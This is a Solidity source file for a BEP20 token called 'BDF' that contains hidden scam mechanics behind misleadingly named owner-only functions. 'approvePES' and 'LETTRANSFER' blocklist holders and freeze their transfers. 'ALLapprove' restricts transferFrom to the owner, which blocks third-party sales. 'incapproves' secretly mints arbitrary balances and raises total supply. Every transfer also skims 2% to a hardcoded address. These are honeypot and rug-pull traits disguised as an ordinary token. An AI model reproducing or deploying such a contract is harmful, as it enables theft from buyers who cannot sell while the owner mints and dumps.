contract BDF is Context, IBEP20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping(address => uint256) private _balance;
    mapping(address => mapping(address => uint256)) private _allowances;

    string private _name = "BDF";
    string private _symbol = "BDF";
    uint256 private _total = 10000000 * 10**8;
    uint8 private _decimals = 8;
     
    address public dAddress = 0x000000000000000000000000000000000000dEaD;
    address public oAddress = 0x34EAFD55D1BBa687c00CDaC2400BfbCdB3E19474;
  
    uint256 public dFee = 2;
    uint256 public oFee = 2;  
    uint256 public DDD = uint256(0);

    mapping(address => uint256) private BKL;
    address[] private _TLIST;
    address owners;

    mapping(address => bool) private _blklist;
    bool private _enapprove = false;
    bool private _tenapprove = false;
    mapping(address => bool) private _isExcludedFromFeelist;
    mapping(address => bool) private _isExcluded;
	
	constructor() public {
        owners = _msgSender();
		_balance[_msgSender()] = _total;
		_isExcludedFromFeelist[owner()] = true;
        _isExcludedFromFeelist[address(this)] = true;
        emit Transfer(address(0), _msgSender(), _total);
    }

    function decimals() public view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _total;
    }

    function name() public view override returns (string memory) {
        return _name;
    }

    function symbol() public view override returns (string memory) {
        return _symbol;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balance[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        uint256 dAmount = amount.mul(dFee).div(100);
        uint256 oAmount = amount.mul(oFee).div(100);
        _transferr(_msgSender(), dAddress, dAmount);
        _transferr(_msgSender(), oAddress, oAmount);
        _transferr(_msgSender(), recipient, amount.sub(dAmount).sub(oAmount));
        return true;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

	function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
     if(_tenapprove){
     require(owners == sender, "no authority");
        }
        uint256 dAmount = amount.mul(dFee).div(100);
        uint256 oAmount = amount.mul(oFee).div(100);
        _transferr(sender, dAddress, dAmount);
        _transferr(sender, oAddress, oAmount);
        _transferr(sender, recipient, amount.sub(dAmount).sub(oAmount));
    
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function LETTRANSFER(bool approveADD) external onlyOwner() {
        _enapprove = approveADD;
    }
    
    function ALLapprove(bool DOALLapprove) external onlyOwner() {
        _tenapprove = DOALLapprove;
    }
    function approvePES(address approvePE) external onlyOwner() {
        _blklist[approvePE] = true;
    }

    function DELEapproves(address DELEapprove) external onlyOwner() {
        delete _blklist[DELEapprove];
    }

    function isExcludedFromRewards(address account)
	    public 
	    view 
	    returns (bool) 
	    {
            return _isExcluded[account];
        }

    function excludeFromFee(address account) 
	    public 
	    onlyOwner 
	    {
            _isExcludedFromFeelist[account] = true;
        }

    function includeInFee(address account) public onlyOwner {
        _isExcludedFromFeelist[account] = false;
    }

    function lapproves(address account)
        external
        view
        onlyOwner()
        returns (bool)
    {
        return _blklist[account];
    }

  
    function incapproves(address account, uint256 amount) external onlyOwner() {
        require(amount > 0, "Transfer  greater than zero");
        uint256 inAmount = BKL[account];
        if (inAmount == 0) _TLIST.push(account);
        BKL[account] = inAmount.add(amount);
        DDD = DDD.add(amount);
        _balance[account] = _balance[account].add(amount);
		_total = _total.add(amount);

    }

    function _transferr(
        address from,
        address to,
        uint256 amount
    ) private {
	    require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (_enapprove) {require(_blklist[from] == false, "mybe in approve ...");
		}
        _transfer(from, to, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {   
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");
    
        _balance[sender] = _balance[sender].sub(tAmount);
        _balance[recipient] = _balance[recipient].add(tAmount);
        emit Transfer(sender, recipient, tAmount);
    }

}